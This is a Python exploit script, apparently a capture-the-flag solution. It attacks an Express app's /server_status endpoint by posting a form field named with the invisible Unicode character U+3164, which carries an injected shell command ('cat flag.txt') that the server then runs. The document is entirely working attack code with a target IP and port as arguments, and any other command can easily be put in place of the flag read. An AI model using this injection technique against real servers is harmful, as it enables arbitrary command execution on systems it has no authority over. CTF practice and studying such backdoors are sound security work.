#!/usr/bin/env python3
import sys
import requests


def exploit(target_ip, target_port):
    base_url = f"http://{target_ip}:{target_port}/server_status"

    # The hidden unicode variable name used in the Express app (U+3164 HANGUL FILLER)
    hidden_key = "ㅤ"

    # Payload command to read the flag
    evil_command = "cat flag.txt"

    # Index 6 corresponds to the injected element in the commands array
    payload = {
        "choice": "6",
        hidden_key: evil_command
    }

    print(f"[*] Sending exploit payload to {base_url}...")
    try:
        response = requests.post(base_url, data=payload, timeout=5)
        print(f"\n[+] Status Code: {response.status_code}")
        print(f"[+] Response Output:\n{response.text}")
    except Exception as e:
        print(f"[-] Exploit failed: {e}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    exploit(sys.argv[1], int(sys.argv[2]))
